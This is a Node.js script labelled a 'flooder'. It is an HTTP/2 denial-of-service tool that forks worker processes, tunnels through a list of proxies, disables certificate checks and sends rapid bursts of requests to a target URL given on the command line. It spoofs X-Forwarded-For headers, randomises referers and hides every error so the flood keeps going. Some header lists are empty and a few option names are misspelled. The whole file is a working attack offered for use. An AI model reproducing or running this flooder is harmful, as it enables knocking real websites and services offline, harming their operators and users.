//flooder
const 
http = require('http');
http2 = require('http2')
net = require('net')
tls = require('tls')
ua = require('user-agents')
request = require('request');
cluster = require('cluster')
fs = require('fs');
const url = require('url');
const crypto = require('crypto');


const currentTime = new Date();
const httpTime = currentTime.toUTCString();


 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 process.on('uncaughtException', function (exception) {
 });

const fetch_site = [
    "same-origin",
    "same-site",
    "cross-site",
    "none"
  ];
  
  const type = [
  ];
  
  
  
  const referer = [
    'https://www.google.com',
    'https://www.facebook.com',
    'https://www.twitter.com',
    'https://www.youtube.com',
    'https://www.amazon.com',
    'https://www.netflix.com',
    'https://www.instagram.com',
    'https://www.yahoo.com',
    'https://www.stackoverflow.com',
    'https://www.github.com',
    'https://www.linkedin.com',
    'https://www.cnn.com',
    'https://www.apple.com',
    'https://www.microsoft.com',
    'https://www.wikipedia.org',
    'https://www.nytimes.com',
    'https://www.msn.com',
    'https://www.reddit.com',
    'https://www.quora.com',
    'https://www.npr.org',
    'https://www.bbc.com',
    'https://www.theguardian.com',
    'https://www.huffingtonpost.com',
    'https://www.washingtonpost.com',
    'https://www.wsj.com',
    'https://www.bloomberg.com',
    'https://www.cnbc.com',
    'https://www.merriam-webster.com',
    'https://www.dictionary.com',
    'https://www.thedailybeast.com',
    'https://www.thedailyshow.com',
    'https://www.colbertnation.com',
    'https://www.nationalgeographic.com',
    'https://www.nasa.gov',
    'https://www.nypl.org',
    'https://www.britannica.com',
    'https://www.healthline.com',
    'https://www.webmd.com',
    'https://www.mayoclinic.org',
    'https://www.cdc.gov',
    'https://www.nih.gov',
    'https://www.medlineplus.gov',
    'https://www.cancer.gov',
    'https://www.fda.gov',
    'https://www.nature.com',
    'https://www.sciencemag.org',
    'https://www.scientificamerican.com',
    'https://www.who.int',
    'https://www.un.org',
    'https://www.worldbank.org',
    'https://www.imf.org',
    'https://www.wto.org',
    'https://www.oecd.org',
    'https://www.europa.eu',
    'https://www.nato.int',
    'https://www.icrc.org',
    'https://www.amnesty.org',
    'https://www.hrw.org',
    'https://www.greenpeace.org',
    'https://www.oxfam.org',
    'https://www.doctorswithoutborders.org',
    'https://www.unicef.org',
    'https://www.savethechildren.org',
    'https://www.redcross.org',
    'https://www.wikipedia.org',
    'https://www.wikimedia.org',
    'https://www.mozilla.org',
    'https://www.apache.org',
    'https://www.mysql.com',
    'https://www.php.net',
    'https://www.python.org',
    'https://www.ruby-lang.org',
    'https://www.jquery.com',
    'https://www.reactjs.org',
    'https://www.angularjs.org',
    'https://www.vuejs.org',
    'https://www.bootstrap.com',
    'https://www.materializecss.com',
    'https://www.sass-lang.com',
    'https://www.lesscss.org',
    'https://www.d3js.org',
    'https://www.highcharts.com',
    'https://www.chartjs.org',
    'https://www.mapbox.com',
    'https://www.mapboxgl-js.com',
    'https://www.openstreetmap.org',
    'https://www.mapbox.com',
    'https://www.mapboxgl-js.com',
    'https://www.chartjs.org',
    'https://www.highcharts.com',
    'https://www.d3js.org',
    'https://www.lesscss.org',
    'https://www.sass-lang.com',
    'https://www.materializecss.com',
    'https://www.bootstrap.com',
    'https://www.vuejs.org',
    'https://www.angularjs.org',
    'https://www.reactjs.org',
    'https://www.jquery.com',
    'https://www.ruby-lang.org',
    'https://www.python.org',
    'https://www.php.net',
    'https://www.mysql.com',
    'https://www.apache.org',
    'https://www.mozilla.org',
    'https://www.wikimedia.org',
    'https://www.wikipedia.org',
    'https://www.redcross.org',
    'https://www.savethechildren.org',
    'https://www.unicef.org',
    'https://www.doctorswithoutborders.org',
    'https://www.oxfam.org',
    'https://www.greenpeace.org',
    'https://www.hrw.org',
    'https://www.amnesty.org',
    'https://www.icrc.org',
    'https://www.nato.int',
    'https://www.europa.eu',
    'https://www.oecd.org',
    'https://www.wto.org',
    'https://www.imf.org',
    'https://www.worldbank.org',
    'https://www.un.org',
    'https://www.who.int',
    'https://www.scientificamerican.com',
    'https://www.sciencemag.org',
    'https://www.nature.com',
    'https://www.fda.gov',
    'https://www.cancer.gov',
    'https://www.medlineplus.gov',
    'https://www.nih.gov',
    'https://www.cdc.gov',
    'https://www.mayoclinic.org',
    'https://www.webmd.com',
    'https://www.healthline.com',
    'https://www.britannica.com',
    'https://www.nypl.org',
    'https://www.nasa.gov',
    'https://www.nationalgeographic.com',
    'https://www.colbertnation.com',
    'https://www.thedailyshow.com',
    'https://www.thedailybeast.com',
    'https://www.dictionary.com',
    'https://www.merriam-webster.com',
    'https://www.cnbc.com',
    'https://www.bloomberg.com',
    'https://www.wsj.com',
    'https://www.washingtonpost.com',
    'https://www.huffingtonpost.com',
    'https://www.theguardian.com',
    'https://www.bbc.com',
    'https://www.npr.org',
    'https://www.quora.com',
    'https://www.reddit.com',
    'https://www.msn.com',
    'https://www.nytimes.com',
    'https://www.wikipedia.org',
    'https://www.microsoft.com',
    'https://www.apple.com',
    'https://www.cnn.com',
    'https://www.linkedin.com',
    'https://www.github.com',
    'https://www.stackoverflow.com',
    'https://www.yahoo.com',
    'https://www.instagram.com',
    'https://www.netflix.com',
    'https://www.amazon.com',
    'https://www.youtube.com',
    'https://www.twitter.com',
    'https://www.facebook.com',
    'https://www.google.com'
  ];
  
  const platform = [
    "Windows",
    "Windows Phone",
    "Macintosh",
    "Linux",
    "iOS",
    "Android",
    "PlayStation 4",
    "Xbox One",
    "Nintendo Switch",
    "Apple TV",
    "Amazon Fire TV",
    "Roku",
    "Chromecast",
    "Smart TV",
    "Other"
  ];
  cplist = [
  
  ];
  
  const accept_header = [
  ];
  const lang_header = [
  ];
  const country = [
  ];
  const fetch_mode = [
  ];
  const fetch_dest = [
  ];
  encoding_header = [
  ];
  const sigalgs = [
    'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
      'ecdsa_brainpoolP256r1tls13_sha256',
      'ecdsa_brainpoolP384r1tls13_sha384',
      'ecdsa_brainpoolP512r1tls13_sha512',
      'ecdsa_sha1',
      'ed25519',
      'ed448',
      'ecdsa_sha224',
      'rsa_pkcs1_sha1',
      'rsa_pss_pss_sha256',
      'dsa_sha256',
      'dsa_sha384',
      'dsa_sha512',
      'dsa_sha224',
      'dsa_sha1',
      'rsa_pss_pss_sha384',
      'rsa_pkcs1_sha2240',
      'rsa_pss_pss_sha512',
      'sm2sig_sm3',
      'ecdsa_secp521r1_sha512',
  ];
  let lmfsa = sigalgs.join(':');

  controle_header = ['no-cache', 'no-store', 'no-transform', 'only-if-cached', 'max-age=0', 'must-revalidate', 'public', 'private', 'proxy-revalidate', 's-maxage=86400'],
  ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'],
  
  ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET',  'ENETUNREACH',  'ENONET',  'ENOTCONN',  'ENOTFOUND',  'EAI_NODATA',  'EAI_NONAME',  'EADDRNOTAVAIL',  'EAFNOSUPPORT',  'EALREADY',  'EBADF',  'ECONNABORTED',  'EDESTADDRREQ',  'EDQUOT',  'EFAULT',  'EHOSTUNREACH',  'EIDRM',  'EILSEQ',  'EINPROGRESS',  'EINTR',  'EINVAL',  'EIO',  'EISCONN',  'EMFILE',  'EMLINK',  'EMSGSIZE',  'ENAMETOOLONG',  'ENETDOWN',  'ENOBUFS',  'ENODEV',  'ENOENT',  'ENOMEM',  'ENOPROTOOPT',  'ENOSPC',  'ENOSYS',  'ENOTDIR',  'ENOTEMPTY',  'ENOTSOCK',  'EOPNOTSUPP',  'EPERM',  'EPIPE',  'EPROTONOSUPPORT',  'ERANGE',  'EROFS',  'ESHUTDOWN',  'ESPIPE',  'ESRCH',  'ETIME',  'ETXTBSY',  'EXDEV',  'UNKNOWN',  'DEPTH_ZERO_SELF_SIGNED_CERT',  'UNABLE_TO_VERIFY_LEAF_SIGNATURE',  'CERT_HAS_EXPIRED',  'CERT_NOT_YET_VALID'];
  
  const headerFunc = {
    accept() {
      for (let i = accept_header.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [accept_header[i], accept_header[j]] = [accept_header[j], accept_header[i]];
      }
      return accept_header[Math.floor(Math.random() * accept_header.length)];
    },
    lang() {
      for (let i = lang_header.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [lang_header[i], lang_header[j]] = [lang_header[j], lang_header[i]];
      }
      return lang_header[Math.floor(Math.random() * lang_header.length)];
    },
    encoding() {
      for (let i = encoding_header.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [encoding_header[i], encoding_header[j]] = [encoding_header[j], encoding_header[i]];
      }
      return encoding_header[Math.floor(Math.random() * encoding_header.length)];
    },
    controling() {
      return controle_header[Math.floor(Math.random() * controle_header.length)];
    },
    cipher() {
      return cplist[Math.floor(Math.random() * cplist.length)];
    },
    referers() {
      for (let i = referer.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [referer[i], referer[j]] = [referer[j], referer[i]];
      }
      return referer[Math.floor(Math.random() * referer.length)]
    },
    platforms() {
      return platform[Math.floor(Math.random() * platform.length)]
    },
    mode() {
      return fetch_mode[Math.floor(Math.random() * fetch_mode.length)]
    },
    dest() {
      return fetch_dest[Math.floor(Math.random() * fetch_dest.length)]
    },
    site() {
      return fetch_site[Math.floor(Math.random() * fetch_site.length)]
    },
    countrys() {
      return country[Math.floor(Math.random() * country.length)]
    },
    type() {
      return type[Math.floor(Math.random() * type.length)]
    },
    
  };
  
const 
target = process.argv[2]
time = process.argv[3]
thread = process.argv[4]
rate = process.argv[5]
prox = process.argv[6]
delay = process.argv[7]
if (process.argv.length < 7 ){
    console.log(` node flooderv2 url time thread rate proxy delay`)
    process.exit(1)

}
function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}
// read file



if (cluster.isMaster){
    for (let i = 0; i < process.argv[4]; i++){
      cluster.fork();
      console.log(thread)
    }
    console.log('started')
    setTimeout(() => {
      process.exit(1);
    }, process.argv[3] * 1000);
  } 
  //set thread 

var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
var proxies = readLines(prox)
const parsed = url.parse(target)
if (cluster.isMaster) {
    for (let counter = 1; counter <= thread; counter++) {
        cluster.fork();
    }
} else {setInterval(startedflood) }
 
class NetSocket {
    constructor(){}

 HTTP(options, callback) {
    const parsedAddr = options.address.split(":");
    const addrHost = parsedAddr[0];
    const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nProxy-Connection: Keep-Alive\r\nConnection: Keep-Alive\r\n\r\n";
    const buffer = new Buffer.from(payload);

    const connection = net.connect({
        host: options.host,
        port: options.port
    });

    connection.setTimeout(options.timeout * 10000);
    connection.setKeepAlive(true, 100000);

    connection.on("connect", () => {
        connection.write(buffer);
    });

    connection.on("data", chunk => {
        const response = chunk.toString("utf-8");
        const isAlive = response.includes("HTTP/1.1 200");
        if (isAlive === false) {
            connection.destroy();
            return callback(undefined, "error: invalid response from proxy server");
        }
        return callback(connection, undefined);
    });

    connection.on("timeout", () => {
        connection.destroy();
        return callback(undefined, "error: timeout exceeded");
    });

    connection.on("error", error => {
        connection.destroy();
        return callback(undefined, "error: " + error);
    });
}
}
function randomIntn(min, max) {
  return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
  return elements[randomIntn(0, elements.length)];
} 



const flood = new NetSocket();
var header = {}
header[':authority'] = parsed.host;
header[':method'] = 'GET';
header[":path"] = parsed.path;
header[':scheme'] = "https";
header['Accept'] = headerFunc.accept();
header['Sec-Ch-Ua'] = 'notua';
header['Sec-Ch-Ua-Mobile'] = '?0';
header['Sec-Fetch-User'] = "?1";
header['Upgrade-Insecure-Request'] = '1';
header['User-Agent'] = 'notua';
header['Referrer'] =  'nothing';








function startedflood(){

    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsed.host + ":443",
        timeout: 25
    };
    header['X-Forwarded-For']= parsedProxy[0];
    header['Cookie']= `nothing`;


    setTimeout(function(){
        process.exit(1);
      }, time * 1000);
      
    process.on('uncaughtException', function(er) {
    });
    process.on('unhandledRejection', function(er) {
    });

    flood.HTTP(proxyOptions, (connection, error) => {
        if (error) return
        const settingtls = {
            host: parsed.host,
            port: 443,
            uri : parsed.host,
            rejectUnauthorized: false,
            ALPNProtocols: ['h2'],
            ciphers: cipper,
            severname: parsed.host,
            secureProtocol: ["TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method",],
            socket: connection,
            sigals: lmfsa,
        }
        const tlsConn = tls.connect(443, parsed.host, settingtls); 
        const client = http2.connect(parsed.href, {
            protocol: "https:",
            settings: {
           headerTableSize: 65536,
           maxConcurrentStreams: 1000,
           initialWindowSize: 6291456,
           maxHeaderListSize: 262144,
           enablePush: false
         },
            maxSessionMemory: 64000,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn,
            
        });
        client.on("connect", () => {
                setInterval(() => {
                for (let i = 0; i < rate; i++) {
                    const request = client.request(header)
                    
                    .on("response", response => {
                        request.close();
                        request.destroy();
                        return
                    });
    
                    request.end();
                }
            }, delay); 
         });
         client.on("close", () => {
            client.destroy();
            connection.destroy();
            return
        });

        client.on("error", error => {
            client.destroy();
            connection.destroy();
            return
        });

    })




}